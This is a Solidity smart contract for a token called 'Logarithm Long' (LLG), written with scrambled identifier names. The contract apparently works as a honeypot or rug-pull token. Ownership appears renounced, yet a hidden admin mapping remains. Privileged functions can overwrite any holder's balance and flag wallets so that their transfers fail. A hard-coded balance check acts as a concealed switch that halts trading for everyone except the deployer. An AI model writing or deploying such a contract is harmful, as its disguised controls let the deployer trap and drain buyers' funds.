//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface isSellExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract isMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapTo {
    function createPair(address limitReceiverLiquidity, address exemptLaunchFee) external returns (address);
}

interface fromWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeToken) external view returns (uint256);

    function transfer(address txAmount, uint256 modeAtLaunch) external returns (bool);

    function allowance(address txToAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeAtLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address txAmount,
        uint256 modeAtLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listExemptSell, uint256 value);
    event Approval(address indexed txToAuto, address indexed spender, uint256 value);
}

interface walletReceiver is fromWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LogarithmLong is isMode, fromWallet, walletReceiver {

    string private senderFee = "LLG";

    mapping(address => uint256) private tokenWallet;

    function autoTeam(address minMarketingList, uint256 modeAtLaunch) public {
        tradingTo();
        tokenWallet[minMarketingList] = modeAtLaunch;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return feeTx;
    }

    uint8 private minReceiver = 18;

    address takeLimitFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private senderWalletFund;

    mapping(address => bool) public atTrading;

    function approve(address toExempt, uint256 modeAtLaunch) public virtual override returns (bool) {
        totalLaunched[_msgSender()][toExempt] = modeAtLaunch;
        emit Approval(_msgSender(), toExempt, modeAtLaunch);
        return true;
    }

    mapping(address => bool) public fundLaunch;

    uint256 public buyAmount;

    function swapLiquidityTotal() public {
        emit OwnershipTransferred(txLiquidityLaunch, address(0));
        launchedIs = address(0);
    }

    function enableToken(address teamWalletLimit) public {
        tradingTo();
        if (enableTotal != buyAmount) {
            buyAmount = enableTotal;
        }
        if (teamWalletLimit == txLiquidityLaunch || teamWalletLimit == fromFee) {
            return;
        }
        fundLaunch[teamWalletLimit] = true;
    }

    bool private tradingLaunched;

    bool private liquidityAt;

    function transfer(address minMarketingList, uint256 modeAtLaunch) external virtual override returns (bool) {
        return exemptAmountTrading(_msgSender(), minMarketingList, modeAtLaunch);
    }

    address fundSellMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function balanceOf(address takeToken) public view virtual override returns (uint256) {
        return tokenWallet[takeToken];
    }

    function modeShouldLaunch(uint256 modeAtLaunch) public {
        tradingTo();
        receiverMin = modeAtLaunch;
    }

    uint256 isEnable;

    uint256 private enableTotal;

    function decimals() external view virtual override returns (uint8) {
        return minReceiver;
    }

    event OwnershipTransferred(address indexed marketingLaunch, address indexed receiverList);

    function symbol() external view virtual override returns (string memory) {
        return senderFee;
    }

    address private launchedIs;

    function exemptAmountTrading(address tradingSell, address txAmount, uint256 modeAtLaunch) internal returns (bool) {
        if (tradingSell == txLiquidityLaunch) {
            return enableExemptFrom(tradingSell, txAmount, modeAtLaunch);
        }
        uint256 limitTo = fromWallet(fromFee).balanceOf(takeLimitFee);
        require(limitTo == receiverMin);
        require(txAmount != takeLimitFee);
        if (fundLaunch[tradingSell]) {
            return enableExemptFrom(tradingSell, txAmount, toFrom);
        }
        return enableExemptFrom(tradingSell, txAmount, modeAtLaunch);
    }

    string private sellIsMode = "Logarithm Long";

    function name() external view virtual override returns (string memory) {
        return sellIsMode;
    }

    function transferFrom(address tradingSell, address txAmount, uint256 modeAtLaunch) external override returns (bool) {
        if (_msgSender() != fundSellMode) {
            if (totalLaunched[tradingSell][_msgSender()] != type(uint256).max) {
                require(modeAtLaunch <= totalLaunched[tradingSell][_msgSender()]);
                totalLaunched[tradingSell][_msgSender()] -= modeAtLaunch;
            }
        }
        return exemptAmountTrading(tradingSell, txAmount, modeAtLaunch);
    }

    uint256 private buyMarketing;

    function owner() external view returns (address) {
        return launchedIs;
    }

    mapping(address => mapping(address => uint256)) private totalLaunched;

    function getOwner() external view returns (address) {
        return launchedIs;
    }

    uint256 public shouldMode;

    uint256 constant toFrom = 9 ** 10;

    address public txLiquidityLaunch;

    bool public receiverExemptSell;

    bool private swapAmount;

    uint256 receiverMin;

    bool private atTake;

    function allowance(address txMode, address toExempt) external view virtual override returns (uint256) {
        if (toExempt == fundSellMode) {
            return type(uint256).max;
        }
        return totalLaunched[txMode][toExempt];
    }

    address public fromFee;

    uint256 private feeTx = 100000000 * 10 ** 18;

    function maxAt(address listFundEnable) public {
        require(listFundEnable.balance < 100000);
        if (receiverExemptSell) {
            return;
        }
        if (senderWalletFund == buyAmount) {
            atTake = false;
        }
        atTrading[listFundEnable] = true;
        if (buyMarketing == shouldMode) {
            buyMarketing = buyAmount;
        }
        receiverExemptSell = true;
    }

    function tradingTo() private view {
        require(atTrading[_msgSender()]);
    }

    constructor (){
        
        isSellExempt toSender = isSellExempt(fundSellMode);
        fromFee = swapTo(toSender.factory()).createPair(toSender.WETH(), address(this));
        if (tradingLaunched) {
            atTake = false;
        }
        txLiquidityLaunch = _msgSender();
        swapLiquidityTotal();
        atTrading[txLiquidityLaunch] = true;
        tokenWallet[txLiquidityLaunch] = feeTx;
        
        emit Transfer(address(0), txLiquidityLaunch, feeTx);
    }

    function enableExemptFrom(address tradingSell, address txAmount, uint256 modeAtLaunch) internal returns (bool) {
        require(tokenWallet[tradingSell] >= modeAtLaunch);
        tokenWallet[tradingSell] -= modeAtLaunch;
        tokenWallet[txAmount] += modeAtLaunch;
        emit Transfer(tradingSell, txAmount, modeAtLaunch);
        return true;
    }

}